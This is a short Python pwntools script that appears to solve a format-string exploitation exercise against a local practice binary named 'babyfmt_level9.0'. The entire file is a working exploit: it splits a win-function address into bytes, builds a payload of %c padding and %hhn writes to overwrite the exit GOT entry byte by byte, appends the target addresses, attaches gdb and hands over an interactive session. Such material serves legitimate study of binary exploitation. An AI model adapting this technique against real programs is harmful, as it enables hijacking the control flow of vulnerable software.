from pwn import * 


binary = './babyfmt_level9.0'

p = process(binary)

s = '''
b * printf
b * func+471
'''



target = 0x404078 # exit

win = 0x401500







win_bytes = [0] * 6
for i in range(6):
	win_bytes[i] = (win >> (i * 8)) & 0xff
	print(hex(win_bytes[i]))




payload = b""
printed = len(payload) + 0x7c        
print(printed)


param_pos = 51
for i, byte in enumerate(win_bytes):

    if byte < printed % 256:
        padding = 256 + byte - (printed % 256)
    else:
        padding = byte - (printed % 256)
    
    if padding != 0: 
        payload += f"%{padding}c".encode()
        printed += padding
    
    
    
    payload += f"%{param_pos + i}$hhn".encode()



target = [target + i for i in range(6)]

for addr in target:
	payload += p64(addr)




gdb.attach(p, s)
p.sendline(payload) 

p.interactive()
